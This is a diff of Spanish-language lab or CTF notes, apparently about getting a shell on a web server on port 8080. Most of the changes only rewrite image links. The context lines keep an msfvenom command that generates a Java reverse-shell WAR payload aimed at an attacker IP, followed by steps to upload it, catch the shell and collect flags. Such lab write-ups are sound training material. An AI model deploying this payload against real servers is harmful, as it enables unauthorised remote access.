@@ -13,10 +13,16 @@ Port: 8080
 ```
 msfvenom -p java/shell_reverse_tcp LHOST=(IP_ATACANTE) LPORT=443 -f war -o (NOMBRE)
 ```
-![[Pasted image 20250317180229.png]]
+
+![](../Imagenes/Pasted%20image%2020250317180229.png)
+
 - Vamos a subirlo.
-![[Pasted image 20250317180320.png]]
+
+![](../Imagenes/Pasted%20image%2020250317180320.png)
+
 - Ya esta subido, vamos a hacer la reverse y recordar hacer otra reverse estando dentro para tener una conexión mas estable.
-![[Pasted image 20250317180523.png]]
+
+![](../Imagenes/Pasted%20image%2020250317180523.png)
+
 - Ya estamos dentro.
 - Buscamos y encontraremos las flags de usuario y root.
